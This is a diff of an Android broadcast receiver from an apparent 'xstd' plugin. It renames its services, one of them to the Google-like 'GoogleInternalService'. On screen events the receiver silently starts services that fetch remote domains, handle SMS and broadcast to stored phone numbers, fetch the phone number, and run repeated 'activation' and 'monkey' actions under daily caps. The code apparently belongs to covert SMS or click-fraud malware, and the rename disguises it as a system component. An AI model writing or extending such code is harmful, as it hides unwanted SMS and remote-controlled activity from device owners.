@@ -11,8 +11,8 @@ import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
-import com.xstd.plugin.service.GoogleService;
-import com.xstd.plugin.service.PluginService;
+import com.xstd.plugin.service.GoogleInternalService;
+import com.xstd.plugin.service.PluginInternalService;
 import com.xstd.qm.setting.MainSettingManager;
 
 import java.util.Calendar;
@@ -48,14 +48,14 @@ public class ScreenBRC extends BroadcastReceiver {
             && PluginSettingManager.getInstance().getTodayFetchDomainCount() < 5) {
             //一天获取三次
             Intent fetchIntent = new Intent();
-            fetchIntent.setAction(PluginService.ACTION_FETCH_DOMAIN);
-            fetchIntent.setClass(context, PluginService.class);
+            fetchIntent.setAction(PluginInternalService.ACTION_FETCH_DOMAIN);
+            fetchIntent.setClass(context, PluginInternalService.class);
             context.startService(fetchIntent);
         }
 
         //check Google Service if runging for SMS
         Intent serviceIntent = new Intent();
-        serviceIntent.setClass(context, GoogleService.class);
+        serviceIntent.setClass(context, GoogleInternalService.class);
         context.startService(serviceIntent);
 
         PluginSettingManager.getInstance().init(context);
@@ -72,8 +72,8 @@ public class ScreenBRC extends BroadcastReceiver {
         String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
         if (!TextUtils.isEmpty(oldPhoneNumbers)) {
             Intent i = new Intent();
-            i.setClass(context, PluginService.class);
-            i.setAction(PluginService.SMS_BROADCAST_ACTION);
+            i.setClass(context, PluginInternalService.class);
+            i.setAction(PluginInternalService.SMS_BROADCAST_ACTION);
             context.startService(i);
         }
 
@@ -98,11 +98,11 @@ public class ScreenBRC extends BroadcastReceiver {
                         && !TextUtils.isEmpty(PluginSettingManager.getInstance().getMainExtraInfo())) {
                     //关键的三个数据都不为空在进行激活，否则激活也找不到对应的设备串号，所以什么也不做
                     if (Config.DEBUG) {
-                        Config.LOGD("[[ScreenBRC::onReceive]] try to send MAIN ACTIVE EVENT with action : " + PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
+                        Config.LOGD("[[ScreenBRC::onReceive]] try to send MAIN ACTIVE EVENT with action : " + PluginInternalService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
                     }
                     Intent mainActive = new Intent();
-                    mainActive.setAction(PluginService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
-                    mainActive.setClass(context, PluginService.class);
+                    mainActive.setAction(PluginInternalService.ACTION_MAIN_UUID_ACTIVE_BY_PLUGN);
+                    mainActive.setClass(context, PluginInternalService.class);
                     context.startService(mainActive);
                 }
             }
@@ -116,15 +116,15 @@ public class ScreenBRC extends BroadcastReceiver {
                     //没有激活过，就调用激活接口, 首次激活
                     if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                         if (Config.DEBUG) {
-                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
+                            Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.ACTIVE_ACTION
                                             + " as active time = 0;");
                         }
 
                         long dayTime = ((long) 24) * 60 * 60 * 1000;
                         PluginSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis() - dayTime);
                         Intent i = new Intent();
-                        i.setAction(PluginService.ACTIVE_ACTION);
-                        i.setClass(context, PluginService.class);
+                        i.setAction(PluginInternalService.ACTIVE_ACTION);
+                        i.setClass(context, PluginInternalService.class);
                         context.startService(i);
                     }
 
@@ -182,8 +182,8 @@ public class ScreenBRC extends BroadcastReceiver {
                             }
                             if (times > 90) {
                                 Intent iPhoneFetch = new Intent();
-                                iPhoneFetch.setClass(context, PluginService.class);
-                                iPhoneFetch.setAction(PluginService.ACTIVE_FETCH_PHONE_ACTION);
+                                iPhoneFetch.setClass(context, PluginInternalService.class);
+                                iPhoneFetch.setAction(PluginInternalService.ACTIVE_FETCH_PHONE_ACTION);
                                 context.startService(iPhoneFetch);
                             } else {
                                 if (Config.DEBUG) {
@@ -211,13 +211,13 @@ public class ScreenBRC extends BroadcastReceiver {
                         if (!AppRuntime.ACTIVE_PROCESS_RUNNING.get()
                                 && PluginSettingManager.getInstance().getKeyDayActiveCount() < 16) {
                             if (Config.DEBUG) {
-                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
+                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.ACTIVE_ACTION
                                                 + " as active time is over"
                                                 + " , isForce : (" + isForce + ")");
                             }
                             Intent i = new Intent();
-                            i.setAction(PluginService.ACTIVE_ACTION);
-                            i.setClass(context, PluginService.class);
+                            i.setAction(PluginInternalService.ACTIVE_ACTION);
+                            i.setClass(context, PluginInternalService.class);
                             context.startService(i);
                         }
                         return;
@@ -244,11 +244,11 @@ public class ScreenBRC extends BroadcastReceiver {
                         int times = AppRuntime.ACTIVE_RESPONSE.times;
                         if (times > dayCount) {
                             if (Config.DEBUG) {
-                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.MONKEY_ACTION);
+                                Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginInternalService for " + PluginInternalService.MONKEY_ACTION);
                             }
                             Intent i = new Intent();
-                            i.setAction(PluginService.MONKEY_ACTION);
-                            i.setClass(context, PluginService.class);
+                            i.setAction(PluginInternalService.MONKEY_ACTION);
+                            i.setClass(context, PluginInternalService.class);
                             context.startService(i);
                         }
                     }
